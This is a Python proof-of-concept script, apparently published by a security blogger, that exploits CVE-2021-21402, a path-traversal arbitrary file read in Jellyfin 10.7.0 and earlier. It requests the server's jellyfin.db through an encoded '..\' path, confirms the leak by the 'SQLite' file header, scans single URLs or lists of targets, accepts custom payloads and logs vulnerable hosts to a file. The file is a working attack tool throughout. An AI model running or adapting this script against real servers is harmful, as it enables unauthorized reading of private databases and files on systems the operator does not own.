#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3, time, re, argparse
from colorama import init
init(autoreset=True)

def title():
    print("")
    print('*'.center(60, '*'))
    print("Version：Jellyfin <= 10.7.0".center(50))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(40))
    print("")
    print('*'.center(60, '*'))
    print("")

class CVE_2021_21402_POC():
    def CVE_2021_21402_Check(self, url):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        option = input("\n是否使用默认POC验证(y|n)：")
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
            "accept": "application/json",
            "Referer": "{0}/web/index.html",
            "Accept-Language": "zh-CN,zh; q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US; q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        if option == "y":
            poc = f"{url}/Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/"
            try:
                data = requests.get(poc, headers=headers, verify=False, timeout=3)
                try:
                    ret = re.split(" | ", data.text)[0]
                    if ret == "SQLite":
                        print(f"\033[32m[+] {url}存在Jellyfin任意文件读取漏洞!")
                        with open("vuln-Jellyfin_urls.txt", 'a') as f:
                            f.writelines(url + "\n")
                    else:
                        print(f"[n] {url}不存在该漏洞")
                except Exception as e:
                    print(f"[n] {url}不存在该漏洞", e)
            except requests.exceptions.ConnectTimeout:
                print(f"[n] {url}请求超时！")
        elif option == "n":
            defined_poc = input("\n请输入自定义POC：")
            poc = f"{url}/{defined_poc}"
            try:
                data = requests.get(poc, headers=headers, verify=False, timeout=3).status_code
                if data == 200:
                    print(f"\033[32m[+] {url}可能存在Jellyfin任意文件读取漏洞!")
                    with open("vuln-Jellyfin_urls.txt", 'a') as f:
                        f.writelines(url + "\n")
                else:
                    print(f"[n] {url}不存在该漏洞")
            except requests.exceptions.ConnectTimeout:
                print(f"[n] {url}请求超时！")
            except Exception as e:
                print(f"[n] {url}不存在该漏洞", e)
        else:
            print("输入有误！")
            exit()

    def CVE_2021_21402_Batch_Check(self, url, file):
        if url:
            return True
        elif file:
            for url in file:
                url = url.replace('\n', '')
                time.sleep(1)
                if option == "y":
                    poc = f"{url}/Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/"
                    try:
                        data = requests.get(poc, headers=headers, verify=False, timeout=3)
                        try:
                            ret = re.split(" | ", data.text)[0]
                            if ret == "SQLite":
                                print(f"\033[32m[+] {url}存在Jellyfin任意文件读取漏洞!")
                                with open("vuln-Jellyfin_urls.txt", 'a') as f:
                                    f.writelines(url + "\n")
                            else:
                                print(f"[n] {url}不存在该漏洞")
                        except Exception as e:
                            print(f"[n] {url}不存在该漏洞", e)
                    except requests.exceptions.ConnectTimeout:
                        print(f"[n] {url}请求超时！")
                elif option == "n":
                    defined_poc = input("\n请输入自定义POC：")
                    poc = f"{url}/{defined_poc}"
                    try:
                        data = requests.get(poc, headers=headers, verify=False, timeout=3).status_code
                        if data == 200:
                            print(f"\033[32m[+] {url}可能存在Jellyfin任意文件读取漏洞!")
                            with open("vuln-Jellyfin_urls.txt", 'a') as f:
                                f.writelines(url + "\n")
                        else:
                            print(f"[n] {url}不存在该漏洞")
                    except requests.exceptions.ConnectTimeout:
                        print(f"[n] {url}请求超时！")
                    except Exception as e:
                        print(f"[n] {url}不存在该漏洞", e)
                else:
                    print("输入有误！")
                    exit()

if(__name__ == "__main__"):
    title()
    parser = argparse.ArgumentParser(description="CVE-2021-21402 Jellyfin any_file_reading Script")
    parser.add_argument(
        '-u', '--url', type=str,
        help='Please input target url. eg: https://ip:port'
    )
    parser.add_argument(
        '-f', '--file', type=argparse.FileType('r'),
        help='Please input urls file path. eg: c:\\urls.txt'
    )
    args = parser.parse_args()
    run_POC=CVE_2021_21402_POC()
    if args.url:
        run_POC.CVE_2021_21402_Check(args.url)
    if args.file:
        option = input("\n是否使用默认POC验证(y|n)：")
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
            "accept": "application/json",
            "Referer": "{0}/web/index.html",
            "Accept-Language": "zh-CN,zh; q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US; q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        run_POC.CVE_2021_21402_Batch_Check(args.url, args.file)
        print("\n[done] POC批量验证完成，请查看：vuln-Jellyfin_urls.txt")